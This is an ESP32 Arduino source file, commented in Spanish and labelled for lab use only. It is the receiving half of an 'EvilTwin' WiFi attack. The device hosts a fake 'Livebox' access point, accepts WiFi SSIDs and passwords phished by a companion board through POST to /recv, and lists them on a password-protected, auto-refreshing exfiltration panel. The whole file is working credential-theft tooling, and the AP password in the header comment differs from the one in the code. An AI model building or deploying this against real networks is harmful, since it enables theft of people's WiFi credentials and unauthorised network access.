// ============================================================
//  ESP32 #2 - Exfiltrador WiFi
//  by JRXsec & joaks07
//  Entorno controlado - Solo uso educativo y de laboratorio
//
//  - Levanta el AP "Livebox" con contrasenna "joseapruebame"
//  - Recibe credenciales del ESP32 #1 via HTTP POST en /recv
//  - Las muestra en panel web en 192.168.10.1/panel
//  - Panel protegido con usuario admin / labpass
// ============================================================


// ------------------------------------------------------------
// Librerias
// ------------------------------------------------------------
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>


// ------------------------------------------------------------
// Configuracion
// ------------------------------------------------------------
#define EXFIL_SSID    "Livebox"
#define EXFIL_PASS    "tryharder"
#define PANEL_USER    "admin"
#define PANEL_PASS    "labpass"
#define LED_PIN       2
#define MAX_CREDS     50


// ------------------------------------------------------------
// Red
// ------------------------------------------------------------
IPAddress apIP(192, 168, 10, 1);
WebServer webServer(80);


// ------------------------------------------------------------
// Estructura de credencial
// ------------------------------------------------------------
struct Credential {
  String ssid;
  String password;
  String timestamp;
};


// ------------------------------------------------------------
// Variables globales
// ------------------------------------------------------------
Credential    creds[MAX_CREDS];
int           credCount  = 0;
bool          ledState   = false;
unsigned long lastBlink  = 0;


// ------------------------------------------------------------
// Prototipos
// ------------------------------------------------------------
void handlePanel();
void handleReceive();
void handleNotFound();
void blinkLED();
String buildPanel();


// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  Serial.println("[Exfil] Iniciando ESP32 #2...");

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(EXFIL_SSID, EXFIL_PASS);

  Serial.printf("[Exfil] AP: %s | IP: %s\n", EXFIL_SSID, apIP.toString().c_str());
  Serial.println("[Exfil] Panel: http://192.168.10.1/panel  (admin / labpass)");

  // /panel -> panel web con credenciales
  // /recv  -> recibe POST del ESP32 #1
  webServer.on("/panel", HTTP_GET,  handlePanel);
  webServer.on("/recv",  HTTP_POST, handleReceive);
  webServer.onNotFound(handleNotFound);
  webServer.begin();

  Serial.println("[Exfil] Listo. Esperando credenciales...");
}


// ============================================================
// LOOP
// ============================================================
void loop() {
  webServer.handleClient();
  blinkLED();
}


// ============================================================
// LED
// ============================================================
void blinkLED() {
  // Fijo cuando hay credenciales, parpadeo lento en espera
  if (credCount > 0) { digitalWrite(LED_PIN, HIGH); return; }
  if (millis() - lastBlink >= 1000) {
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState);
    lastBlink = millis();
  }
}


// ============================================================
// RECEPCION - /recv
// Recibe HTTP POST del ESP32 #1 con ssid y password
// ============================================================
void handleReceive() {
  if (!webServer.hasArg("password") || !webServer.hasArg("ssid")) {
    webServer.send(400, "text/plain", "Bad Request");
    return;
  }
  if (credCount >= MAX_CREDS) {
    webServer.send(507, "text/plain", "Full");
    return;
  }

  creds[credCount].ssid      = webServer.arg("ssid");
  creds[credCount].password  = webServer.arg("password");
  creds[credCount].timestamp = String(millis() / 1000) + "s";
  credCount++;

  Serial.printf("[Exfil] *** CREDENCIAL #%d ***  SSID: %s  PWD: %s\n",
    credCount,
    creds[credCount-1].ssid.c_str(),
    creds[credCount-1].password.c_str());

  webServer.send(200, "text/plain", "OK");
}


// ============================================================
// PANEL WEB - /panel
// ============================================================
void handlePanel() {
  if (!webServer.authenticate(PANEL_USER, PANEL_PASS)) {
    return webServer.requestAuthentication();
  }
  webServer.send(200, "text/html", buildPanel());
}

void handleNotFound() {
  webServer.sendHeader("Location", "/panel");
  webServer.send(302);
}


// ============================================================
// HTML DEL PANEL
// ============================================================
String buildPanel() {
  String html =
    "<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<meta http-equiv='refresh' content='3'>"
    "<title>EvilTwin - Panel Exfiltrador</title>"
    "<style>"
    "body{font-family:Arial,sans-serif;background:#1a1a2e;color:#eee;margin:0;padding:0;}"
    "h1{background:#16213e;padding:1em;margin:0;color:#00d4ff;font-size:1.3em;}"
    "h1 small{font-size:0.7em;color:#aaa;display:block;margin-top:4px;}"
    ".panel{max-width:960px;margin:auto;padding:1em;}"
    ".card{background:#16213e;border-radius:8px;padding:1em;margin-bottom:1em;}"
    ".card h2{margin:0 0 0.5em;color:#00d4ff;font-size:1em;text-transform:uppercase;}"
    "table{width:100%;border-collapse:collapse;font-size:0.9em;}"
    "th{background:#0f3460;color:#00d4ff;padding:8px;text-align:left;}"
    "td{padding:7px 8px;border-bottom:1px solid #333;}"
    ".pwd{font-family:monospace;font-size:1.2em;color:#2ecc71;font-weight:bold;}"
    ".num{font-size:2.5em;font-weight:bold;color:#2ecc71;}"
    ".empty{color:#555;text-align:center;padding:2em;font-size:1.1em;}"
    "</style></head><body>"
    "<h1>EvilTwin ESP32 - Panel Exfiltrador"
    "<small>by JRXsec &amp; joaks07 | Refresco cada 3s</small></h1>"
    "<div class='panel'>";

  // Resumen
  html += "<div class='card'><h2>Credenciales Recibidas</h2>";
  html += "<p>Total: <span class='num'>" + String(credCount) + "</span></p></div>";

  // Tabla de credenciales
  html += "<div class='card'><h2>Listado</h2>";
  if (credCount == 0) {
    html += "<p class='empty'>Esperando credenciales del ESP32 #1...</p>";
  } else {
    html += "<table><tr><th>#</th><th>SSID</th><th>Contrasenna</th><th>Tiempo</th></tr>";
    for (int i = credCount - 1; i >= 0; i--) {
      html += "<tr>"
              "<td>" + String(i+1) + "</td>"
              "<td>" + creds[i].ssid + "</td>"
              "<td><span class='pwd'>" + creds[i].password + "</span></td>"
              "<td>" + creds[i].timestamp + "</td>"
              "</tr>";
    }
    html += "</table>";
  }
  html += "</div>";
  html += "</div></body></html>";
  return html;
}
